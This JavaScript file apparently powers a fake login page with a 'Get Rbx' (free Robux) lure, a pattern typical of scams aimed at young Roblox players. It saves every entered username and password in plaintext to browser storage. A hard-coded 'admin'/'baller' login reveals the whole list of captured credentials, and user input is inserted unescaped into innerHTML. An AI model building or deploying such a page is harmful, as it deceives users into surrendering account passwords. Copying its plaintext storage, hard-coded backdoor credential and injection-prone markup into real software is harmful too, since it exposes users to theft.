const loginForm = document.getElementById("loginForm");
const loginContainer = document.querySelector(".login-container");
const errorMessage = document.getElementById("error-message");

let loginHistory = JSON.parse(localStorage.getItem("loginHistory")) || [];
let currentUser = JSON.parse(localStorage.getItem("currentUser")) || null;

if (currentUser) {
  showUserInfo(currentUser.username, currentUser.password);
}

loginForm.addEventListener("submit", function (event) {
  event.preventDefault();

  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();

  if (username && password) {
    errorMessage.textContent = "";

    const newEntry = { username, password };
    loginHistory.push(newEntry);
    localStorage.setItem("loginHistory", JSON.stringify(loginHistory));
    localStorage.setItem("currentUser", JSON.stringify(newEntry));
    currentUser = newEntry;

    showUserInfo(username, password);
  } else {
    errorMessage.textContent = "Please enter both username and password.";
  }
});

function showUserInfo(username, password) {
  loginForm.style.display = "none";
  loginContainer.innerHTML = `
    <h3>Welcome, ${username}!</h3>
    <p><strong>Username:</strong> ${username}</p>
    <p><strong>Password:</strong> ${password}</p>
    <button class="rbx-btn" onclick="window.location.href='getrbx.html'">Get Rbx</button>
    <button class="logout-btn" id="logoutBtn">Log Out</button>
  `;

  if (username === "admin" && password === "baller") {
    const historyBox = document.createElement("div");
    historyBox.className = "login-history";
    historyBox.innerHTML = `<h4>Login History (username & password):</h4><ul id="historyList"></ul>`;
    loginContainer.appendChild(historyBox);

    const historyList = document.getElementById("historyList");
    loginHistory.forEach(entry => {
      const li = document.createElement("li");
      li.textContent = `Username: ${entry.username}, Password: ${entry.password}`;
      historyList.appendChild(li);
    });
  }

  document.getElementById("logoutBtn").addEventListener("click", function () {
    localStorage.removeItem("currentUser");
    currentUser = null;
    location.reload();
  });
}
